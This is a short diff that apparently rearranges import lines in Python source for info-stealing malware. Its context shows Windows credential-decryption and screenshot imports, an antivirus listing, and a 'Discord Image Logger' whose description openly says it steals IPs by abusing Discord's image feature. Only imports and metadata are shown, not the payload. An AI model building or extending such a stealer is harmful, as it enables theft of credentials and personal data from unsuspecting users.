@@ -2,6 +2,11 @@ import os,json,shutil,base64,sqlite3,zipfile,requests,subprocess,psutil,random,c
 from threading import Thread
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
+
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import httpagentparser
+
 from Crypto.Cipher import AES
 config = {
     # Key:
@@ -429,9 +434,6 @@ Antivirus: {avlist}
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
